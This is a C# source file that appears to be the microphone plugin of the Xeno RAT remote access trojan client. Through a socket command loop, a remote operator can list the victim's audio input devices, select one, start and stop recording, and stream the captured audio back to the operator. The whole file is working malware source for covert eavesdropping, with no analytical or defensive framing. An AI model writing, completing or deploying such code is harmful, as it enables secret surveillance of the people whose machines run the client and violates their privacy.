using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using xeno_rat_client;
using NAudio.Wave;
using System.Threading;
using System.Net.Sockets;

namespace Plugin
{
    public class Main
    {
        WaveInEvent waveIn = new WaveInEvent();
        bool playing = false;
        Node MicNode;

        /// <summary>
        /// Runs the specified node and performs audio operations.
        /// </summary>
        /// <param name="node">The node to run.</param>
        /// <returns>A <see cref="Task"/> representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method sends a byte array with value 3 to indicate that it has connected to the specified <paramref name="node"/>.
        /// It then sets up the audio input device with a sample rate of 44100, 16-bit depth, and 2 channels.
        /// The method subscribes to the DataAvailable event of the audio input device and sends the received buffer to the specified <see cref="MicNode"/> if <see cref="playing"/> is true.
        /// After that, it awaits the completion of the <see cref="recvThread"/> method and disposes of the audio input device.
        /// If an exception occurs, it disconnects from the specified <paramref name="node"/>, as well as the <see cref="MicNode"/> and disposes of the audio input device.
        /// </remarks>
        public async Task Run(Node node)
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
            try
            {
                waveIn.WaveFormat = new WaveFormat(44100, 16, 2);
                waveIn.DataAvailable += async (sender, e) =>
                {
                    if (playing)
                    {
                        if (MicNode != null)
                        {
                            await MicNode.SendAsync(e.Buffer);
                        }
                    }

                };
                await recvThread(node);
                waveIn.Dispose();
                MicNode.Disconnect();
            }
            catch 
            {
                node.Disconnect();
                MicNode?.Disconnect();
                waveIn?.Dispose();
            }
        }

        /// <summary>
        /// Asynchronously receives data from the specified node and processes it based on the received commands.
        /// </summary>
        /// <param name="node">The node from which data is received.</param>
        /// <exception cref="ObjectDisposedException">Thrown when the waveIn object is already disposed.</exception>
        /// <returns>An asynchronous task representing the receive operation.</returns>
        /// <remarks>
        /// This method continuously receives data from the specified node while it is connected. It processes the received data based on the commands and performs corresponding actions such as sending device information, setting device number, starting or stopping recording, and adding sub-nodes.
        /// </remarks>
        public async Task recvThread(Node node) 
        {
            while (node.Connected())
            {
                byte[] data = await node.ReceiveAsync();
                if (data == null) 
                {
                    waveIn.Dispose();
                    MicNode.Disconnect();
                    break;
                }
                if (data[0] == 1)
                {
                    await node.SendAsync(node.sock.IntToBytes(WaveInEvent.DeviceCount));
                    for (int i = 0; i < WaveInEvent.DeviceCount; i++)
                    {
                        var deviceInfo = WaveInEvent.GetCapabilities(i);
                        await node.SendAsync(Encoding.UTF8.GetBytes(deviceInfo.ProductName));
                    }
                }
                else if (data[0] == 2)
                {
                    waveIn.DeviceNumber = node.sock.BytesToInt(await node.ReceiveAsync());
                }
                else if (data[0] == 3)
                {
                    playing = true;
                    waveIn.StartRecording();
                }
                else if (data[0] == 4)
                {
                    playing = false;
                    waveIn.StopRecording();
                }
                else if (data[0] == 5) 
                {
                    byte[] id = await node.ReceiveAsync();
                    if (id != null)
                    {
                        int nodeid = node.sock.BytesToInt(id);
                        Node tempnode = null;
                        foreach (Node i in node.Parent.subNodes)
                        {
                            if (i.SetId == nodeid)
                            {
                                await node.SendAsync(new byte[] { 1 });
                                tempnode = i;
                                break;
                            }
                        }
                        if (tempnode == null)
                        {
                            await node.SendAsync(new byte[] { 0 });
                            continue;
                        }
                        node.AddSubNode(tempnode);
                        MicNode = tempnode;
                    }
                    else
                    {
                        break;
                    }
                }
            }
        }
    }

}
